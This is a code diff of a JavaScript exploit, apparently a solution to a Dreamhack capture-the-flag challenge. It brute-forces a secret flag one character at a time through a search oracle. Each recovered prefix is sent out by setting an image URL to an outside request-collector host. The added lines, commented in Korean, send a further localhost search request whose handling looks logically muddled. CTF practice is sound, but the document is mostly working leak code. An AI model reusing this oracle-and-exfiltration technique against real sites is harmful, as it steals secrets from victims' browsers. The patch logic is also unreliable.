@@ -27,14 +27,19 @@
     async function exploit() {
         let chars = "0123456789abcdef}"
         let secret = "DH{22d1445ad68e19";
+        let nextSearchStart = "";
         while (!secret.includes("}")) {
             for (let c of chars) {
                 if (await search(secret + c)) {
                     secret += c;
-                    img.src = `https://hlavjaw.request.dreamhack.games/${secret}`;
+                    img.src = `https://ugnqbmd.request.dreamhack.games/${secret}`;
                     break;
                 }
             }
+        // 이 부분을 추가하여 다음 secret 코드를 찾기 위한 요청을 보냅니다.
+        const response = await req(`http://localhost:8000/search?query=${nextSearchStart}`);
+        nextSearchStart = response.substring(secret.length); // 현재 secret 이후의 문자열을 저장합니다.
+        console.log("Next search start:", nextSearchStart);
         }
     }
     exploit();
